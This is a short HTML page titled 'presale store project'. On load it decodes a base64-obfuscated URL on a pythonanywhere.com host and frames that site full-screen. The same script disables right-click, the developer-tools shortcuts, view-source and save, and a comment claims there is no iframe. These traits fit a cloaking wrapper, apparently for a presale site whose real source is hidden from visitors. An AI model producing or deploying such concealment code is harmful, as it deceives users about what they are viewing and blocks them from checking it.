<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>presale store project</title>
    <style>
        /* Reset default margin and padding */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        /* Fullscreen setup for body and html */
        body, html {
            height: 100%;
            width: 100%;
            margin: 0;
            padding: 0;
            overflow: hidden; /* Remove scrollbars */
            background-color: #f4f4f4;
        }

        /* Iframe that covers the full page */
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
    <script>
        // Disable right-click context menu
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        // Disable keyboard shortcuts for inspect tools (F12, Ctrl+Shift+I, etc.)
        document.addEventListener('keydown', function(e) {
            // F12
            if (e.keyCode === 123) {
                e.preventDefault();
            }
            // Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
            if ((e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || 
                (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83))) {
                e.preventDefault();
            }
        });


        function base64Encode(str) {
                try {
                    return btoa(unescape(encodeURIComponent(str)));
                } catch (e) {
                    return null
                }
            }

            function base64Decode(str) {
              try {
                return decodeURIComponent(escape(atob(str)));
              } catch (e) {
                return null
              }
             }

       document.addEventListener('DOMContentLoaded', function () {
           const encodedUrl = "aHR0cHM6Ly9ub3VyZGRpbmFrLnB5dGhvbmFueXdoZXJlLmNvbS8="; // Base64-encoded URL
           const iframeUrl = base64Decode(encodedUrl);

            const iframe = document.createElement('iframe');
            iframe.src = iframeUrl;
            iframe.frameBorder = '0'; // Remove border if you dont want it
            document.body.appendChild(iframe);
         });



    </script>
</head>
<body>
    <!-- No Iframe Here -->
</body>
</html>
